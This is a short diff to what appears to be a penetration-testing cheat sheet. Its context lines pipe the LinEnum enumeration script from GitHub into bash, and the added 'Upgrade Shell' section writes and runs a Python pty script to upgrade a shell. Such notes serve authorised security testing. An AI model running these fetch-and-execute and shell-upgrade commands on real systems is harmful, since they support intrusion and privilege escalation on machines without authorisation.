@@ -32,3 +32,9 @@ _(skipping obvious stuff like metasploit, nmap, john etc.)_
 ```bash
 curl -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 ```
+
+### Upgrade Shell
+
+```bash
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py && python /tmp/shell.py
+```
